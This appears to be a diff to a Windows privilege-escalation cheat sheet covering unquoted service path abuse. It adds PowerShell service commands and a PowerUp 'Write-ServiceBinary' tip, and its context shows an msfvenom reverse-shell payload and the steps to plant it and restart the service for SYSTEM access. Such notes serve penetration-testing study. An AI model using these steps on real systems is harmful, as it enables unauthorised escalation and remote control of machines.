@@ -267,8 +267,8 @@ We need to ensure that the service is running by `LocalSystem`:
 
 ```
 sc qc <service>
+Get-Service
 ```
-
 Once we've found the binaries that are vulnerable to unquoted service path, we need to find where we have permissions to write, for that work we can use `icacls`:
 
 ```
@@ -286,9 +286,16 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<ip-addr> LPORT=<port> -f exe -o Fir
 Finally we need to restart the service to gain access to system:
 
 ```
+Stop-Service <service>
 sc stop <service>
+
+Start-Service <service>
 sc start <service>
 ```
+
+> **Note**: Its a easier way with `PowerUp.ps1`
+>
+> `Write-ServiceBinary -Name <ServiceName> -UserName <User> -Password <Passwd> -Path <Path>`
 
 
 # Always Install Elevated
